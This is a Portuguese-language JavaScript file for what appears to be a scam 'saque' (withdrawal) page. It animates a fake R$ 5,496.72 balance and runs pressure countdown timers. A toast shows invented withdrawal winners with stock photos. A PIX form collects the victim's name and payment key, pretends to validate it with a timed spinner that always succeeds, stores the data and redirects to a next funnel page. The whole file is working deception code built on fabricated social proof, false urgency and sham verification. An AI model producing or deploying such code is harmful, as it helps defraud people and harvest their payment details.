document.addEventListener("DOMContentLoaded", () => {
  // =========================================================
  // 1) ANIMAÇÃO DO VALOR + CRONÔMETROS
  // =========================================================
  const VALOR_ALVO = 5496.72;
  const DURACAO_ANIMACAO = 1500; // 1.5s

  const elementoValor = document.getElementById("valor-dinheiro");
  const elementoMinutos = document.getElementById("minutos");
  const elementoSegundos = document.getElementById("segundos");
  const elementoTimerAlerta = document.getElementById("timer-alerta");

  // Animação do valor
  if (elementoValor) {
    const tempoInicial = performance.now();

    function atualizarNumeros(tempoAtual) {
      const progresso = Math.min((tempoAtual - tempoInicial) / DURACAO_ANIMACAO, 1);
      const valorAtual = progresso * VALOR_ALVO;

      elementoValor.innerText = valorAtual.toLocaleString("pt-BR", {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2,
      });

      if (progresso < 1) requestAnimationFrame(atualizarNumeros);
    }

    requestAnimationFrame(atualizarNumeros);
  }

  // Cronômetro do modal (13:06)
  let totalSegundosModal = 13 * 60 + 6;
  const contagemRegressivaModal = setInterval(() => {
    const min = Math.floor(totalSegundosModal / 60);
    const seg = totalSegundosModal % 60;

    if (elementoMinutos && elementoSegundos) {
      elementoMinutos.innerText = min.toString().padStart(2, "0");
      elementoSegundos.innerText = seg.toString().padStart(2, "0");
    }

    if (totalSegundosModal <= 0) {
      clearInterval(contagemRegressivaModal);
    } else {
      totalSegundosModal--;
    }
  }, 1000);

  // Cronômetro do alerta (11:37)
  let totalSegundosAlerta = 11 * 60 + 37;
  if (elementoTimerAlerta) {
    const contagemRegressivaAlerta = setInterval(() => {
      const horasA = Math.floor(totalSegundosAlerta / 3600);
      const minA = Math.floor((totalSegundosAlerta % 3600) / 60);
      const segA = totalSegundosAlerta % 60;

      elementoTimerAlerta.innerText = `${horasA.toString().padStart(2, "0")}:${minA
        .toString()
        .padStart(2, "0")}:${segA.toString().padStart(2, "0")}`;

      if (totalSegundosAlerta <= 0) {
        clearInterval(contagemRegressivaAlerta);
      } else {
        totalSegundosAlerta--;
      }
    }, 1000);
  }

  // Fechar modal principal (se existir)
  const btnFechar = document.getElementById("btn-fechar-modal");
  const modal = document.getElementById("modal-overlay");
  if (btnFechar && modal) {
    btnFechar.addEventListener("click", () => {
      modal.style.transition = "opacity 0.5s";
      modal.style.opacity = "0";
      setTimeout(() => {
        modal.style.display = "none";
      }, 500);
    });
  }

  // =========================================================
  // 2) TOAST DE SAQUE
  // =========================================================
  const toast = document.getElementById("toast-saque");
  const toastImg = document.getElementById("toast-img");
  const toastMensagem = document.getElementById("toast-mensagem");

  const listaGanhadores = [
    { nome: "Pedro H.", valor: "R$ 2.029,02", img: "https://i.pravatar.cc/150?img=11" },
    { nome: "Maria S.", valor: "R$ 1.733,92", img: "https://i.pravatar.cc/150?img=5" },
    { nome: "João P.", valor: "R$ 5.496,72", img: "https://i.pravatar.cc/150?img=12" },
    { nome: "Ana C.", valor: "R$ 850,50", img: "https://i.pravatar.cc/150?img=9" },
    { nome: "Lucas M.", valor: "R$ 3.120,00", img: "https://i.pravatar.cc/150?img=15" },
    { nome: "Juliana T.", valor: "R$ 1.050,00", img: "https://i.pravatar.cc/150?img=20" },
  ];

  function mostrarGanhador() {
    if (!toast || !toastImg || !toastMensagem) return;

    const ganhadorAleatorio = listaGanhadores[Math.floor(Math.random() * listaGanhadores.length)];
    toastImg.src = ganhadorAleatorio.img;
    toastMensagem.innerHTML = `${ganhadorAleatorio.nome} sacou <strong class="texto-verde">${ganhadorAleatorio.valor}</strong>`;

    toast.classList.add("show");
    setTimeout(() => toast.classList.remove("show"), 3000);
  }

  setInterval(mostrarGanhador, 5000);
  setTimeout(mostrarGanhador, 2000);

  // =========================================================
  // 3) MODAL PIX + VALIDAÇÃO + MÁSCARAS + TECLADO CERTO NO MOBILE
  // =========================================================
  const modalPix = document.getElementById("modal-pix");
  const btnSacarSaldo = document.getElementById("btn-sacar-saldo");
  const btnSacarVsl = document.getElementById("btn-sacar-saldo-vsl");
  const btnSacarFooter = document.getElementById("btn-sacar-footer");
  const fecharPix = document.getElementById("fechar-pix");

  const inputNome = document.getElementById("pix-nome");
  const inputChave = document.getElementById("pix-chave");
  const btnValidarPix = document.getElementById("btn-validar-pix");
  const botoesTipoPix = document.querySelectorAll(".btn-pix-type");
  let tipoPixSelecionado = "CPF";

  // Helpers
  function onlyDigits(str) {
    return (str || "").replace(/\D/g, "");
  }

  function setButtonEnabled(enabled) {
    if (!btnValidarPix) return;
    btnValidarPix.disabled = !enabled;
    btnValidarPix.classList.toggle("is-disabled", !enabled);
  }

  // ==== Teclado correto no mobile (dinâmico) ====
  function setKeyboardForType(tipo) {
    if (!inputChave) return;

    // defaults
    inputChave.removeAttribute("inputmode");
    inputChave.removeAttribute("pattern");
    inputChave.autocomplete = "off";

    if (tipo === "CPF" || tipo === "Celular") {
      // teclado numérico
      inputChave.type = "tel";
      inputChave.setAttribute("inputmode", "numeric");
      inputChave.setAttribute("pattern", "[0-9]*");
    } else if (tipo === "E-mail") {
      inputChave.type = "email";
      inputChave.setAttribute("inputmode", "email");
    } else {
      // chave aleatória
      inputChave.type = "text";
    }
  }

  // Máscaras
  function maskCPF(value) {
    let v = onlyDigits(value).slice(0, 11);
    v = v.replace(/(\d{3})(\d)/, "$1.$2");
    v = v.replace(/(\d{3})(\d)/, "$1.$2");
    v = v.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
    return v;
  }

  // CPF SIMPLIFICADO: só precisa ter 11 dígitos
  function isValidCPF(value) {
    const cpf = onlyDigits(value);
    return cpf.length >= 11;
  }

  function maskCelular(value) {
    let v = onlyDigits(value).slice(0, 11);
    if (v.length <= 2) return v ? `(${v}` : "";
    if (v.length <= 7) return `(${v.slice(0, 2)}) ${v.slice(2)}`;
    return `(${v.slice(0, 2)}) ${v.slice(2, 7)}-${v.slice(7)}`;
  }

  function isValidCelular(value) {
    const v = onlyDigits(value);
    if (v.length !== 11) return false;
    const ddd = v.slice(0, 2);
    const first = v[2];
    return ddd !== "00" && first === "9";
  }

  function normalizeEmail(value) {
    return (value || "").trim();
  }

  function isValidEmail(value) {
    const v = normalizeEmail(value);
    return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v);
  }

  function normalizeAleatoria(value) {
    return (value || "").trim();
  }

  function isValidAleatoria(value) {
    const v = normalizeAleatoria(value).toLowerCase();
    const uuid = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/;
    const hex32 = /^[0-9a-f]{32}$/;
    return uuid.test(v) || hex32.test(v);
  }

  function applyMask() {
    if (!inputChave) return;
    const raw = inputChave.value;

    if (tipoPixSelecionado === "CPF") inputChave.value = maskCPF(raw);
    else if (tipoPixSelecionado === "Celular") inputChave.value = maskCelular(raw);
    else if (tipoPixSelecionado === "E-mail") inputChave.value = normalizeEmail(raw);
    else if (tipoPixSelecionado === "Chave Aleatória") inputChave.value = normalizeAleatoria(raw);
  }

  function checkFormValid() {
    if (!inputNome || !inputChave) return false;

    const nomeOk = inputNome.value.trim().length >= 3;
    const chave = inputChave.value;

    let chaveOk = false;
    if (tipoPixSelecionado === "CPF") chaveOk = isValidCPF(chave);
    if (tipoPixSelecionado === "Celular") chaveOk = isValidCelular(chave);
    if (tipoPixSelecionado === "E-mail") chaveOk = isValidEmail(chave);
    if (tipoPixSelecionado === "Chave Aleatória") chaveOk = isValidAleatoria(chave);

    inputChave.classList.toggle("is-valid", chaveOk);
    inputChave.classList.toggle("is-invalid", !chaveOk && inputChave.value.trim().length > 0);

    return nomeOk && chaveOk;
  }

  function updateUI() {
    setButtonEnabled(checkFormValid());
  }

  // Eventos
  if (inputChave) {
    // garante teclado numérico logo no padrão (CPF)
    setKeyboardForType(tipoPixSelecionado);

    inputChave.addEventListener("input", () => {
      applyMask();
      updateUI();
    });

    // EXTRA (opcional): se estiver em CPF/Celular, remove letras coladas
    inputChave.addEventListener("paste", () => {
      setTimeout(() => {
        if (tipoPixSelecionado === "CPF" || tipoPixSelecionado === "Celular") {
          inputChave.value = onlyDigits(inputChave.value);
          applyMask();
          updateUI();
        }
      }, 0);
    });
  }

  if (inputNome) inputNome.addEventListener("input", updateUI);

  // Abrir / fechar modal pix (com trava de scroll do body)
  function abrirModalPix() {
    if (!modalPix) return;
    modalPix.style.display = "flex";
    modalPix.style.opacity = "0";
    document.body.style.overflow = "hidden";

    setTimeout(() => {
      modalPix.style.transition = "opacity 0.3s";
      modalPix.style.opacity = "1";
    }, 10);
  }

  function fecharModalPix() {
    if (!modalPix) return;
    modalPix.style.opacity = "0";
    setTimeout(() => {
      modalPix.style.display = "none";
      document.body.style.overflow = "";
    }, 300);
  }

  if (btnSacarSaldo) btnSacarSaldo.addEventListener("click", abrirModalPix);
  if (btnSacarFooter) btnSacarFooter.addEventListener("click", abrirModalPix);
if (btnSacarVsl) btnSacarVsl.addEventListener("click", abrirModalPix);
  if (fecharPix) fecharPix.addEventListener("click", fecharModalPix);

  // Fechar ao clicar no fundo do overlay
  if (modalPix) {
    modalPix.addEventListener("click", (e) => {
      if (e.target === modalPix) fecharModalPix();
    });
  }

  // Tipo Pix
  botoesTipoPix.forEach((botao) => {
    botao.addEventListener("click", (e) => {
      botoesTipoPix.forEach((b) => b.classList.remove("active"));
      e.target.classList.add("active");

      tipoPixSelecionado = e.target.getAttribute("data-type") || "CPF";

      if (inputChave) {
        // teclado certo para cada tipo
        setKeyboardForType(tipoPixSelecionado);

        if (tipoPixSelecionado === "CPF") inputChave.placeholder = "000.000.000-00";
        if (tipoPixSelecionado === "E-mail") inputChave.placeholder = "seuemail@exemplo.com";
        if (tipoPixSelecionado === "Celular") inputChave.placeholder = "(00) 00000-0000";
        if (tipoPixSelecionado === "Chave Aleatória") inputChave.placeholder = "Chave alfanumérica";

        inputChave.value = "";
        inputChave.classList.remove("is-valid", "is-invalid");
      }

      updateUI();
    });
  });

  setButtonEnabled(false);

  // =========================================================
  // 4) CLICK VALIDAR PIX (loading -> sucesso)
  // =========================================================
  const inputIcon = document.getElementById("input-icon");
  const statusBox = document.getElementById("status-box");
  const statusIcon = document.getElementById("status-icon");
  const statusTitle = document.getElementById("status-title");
  const statusDesc = document.getElementById("status-desc");
  const pixFooterText = document.getElementById("pix-footer-text");

  let isValidado = false;

  if (btnValidarPix) {
    btnValidarPix.addEventListener("click", () => {
      const nome = inputNome ? inputNome.value.trim() : "";
      const chave = inputChave ? inputChave.value.trim() : "";

      if (!isValidado) {
        if (!checkFormValid()) {
          updateUI();
          return;
        }

        if (inputIcon) {
          inputIcon.className = "bx bx-loader-alt bx-spin icon-laranja";
          inputIcon.style.display = "block";
        }

        if (statusBox) {
          statusBox.style.display = "flex";
          statusBox.className = "status-box loading";
        }
        if (statusIcon) statusIcon.className = "bx bx-loader-alt bx-spin";
        if (statusTitle) statusTitle.innerText = "Validando chave PIX...";
        if (statusDesc) statusDesc.innerText = "Aguarde enquanto verificamos sua chave";

        btnValidarPix.disabled = true;
        btnValidarPix.className = "btn-validar btn-loading";
        btnValidarPix.innerHTML =
          "<i class='bx bx-loader-alt bx-spin' style='font-size: 1.2rem;'></i> Validando...";
        if (pixFooterText) pixFooterText.style.display = "block";

        setTimeout(() => {
          if (inputIcon) inputIcon.className = "bx bx-check-circle icon-verde";

          if (statusBox) statusBox.className = "status-box success";
          if (statusIcon) statusIcon.className = "bx bx-check-circle";
          if (statusTitle) statusTitle.innerText = "Chave PIX validada!";
          if (statusDesc) statusDesc.innerText = "Clique no botão abaixo para solicitar o saque";

          btnValidarPix.disabled = false;
          btnValidarPix.className = "btn-validar btn-success";
          btnValidarPix.innerHTML = "SOLICITAR SAQUE";
          if (pixFooterText) pixFooterText.style.display = "none";

          const dadosPix = {
            nomeCompleto: nome,
            tipoChave: tipoPixSelecionado,
            chavePix: chave,
            valorSaque: "5496.72",
          };
          localStorage.setItem("dadosSaquePix", JSON.stringify(dadosPix));

          isValidado = true;
        }, 2500);
      } else {
        window.location.href = "/saque/index.html";
      }
    });
  }
  // --- ADICIONAR ISSO NO FINAL DO SEU DOMContentLoaded ---

  // 1. Confete ao entrar
  if (typeof confetti === 'function') {
    setTimeout(() => {
      confetti({
        particleCount: 150,
        spread: 70,
        origin: { y: 0.6 },
        zIndex: 10000
      });
    }, 500);
  }

  // 2. Áudio + Confete no clique do botão "Sacar Agora"
  const btnSacarModal = document.getElementById('btn-fechar-modal');
  const somSacar = document.getElementById('meu-audio');

  if (btnSacarModal) {
    btnSacarModal.addEventListener('click', () => {
      // Toca o áudio
      if (somSacar) {
        somSacar.currentTime = 0;
        somSacar.play().catch(e => console.log("Erro som:", e));
      }
      // Estouro extra de confete no clique
      if (typeof confetti === 'function') {
        confetti({ particleCount: 100, spread: 60, origin: { y: 0.7 }, zIndex: 10000 });
      }
    });
  }
  
});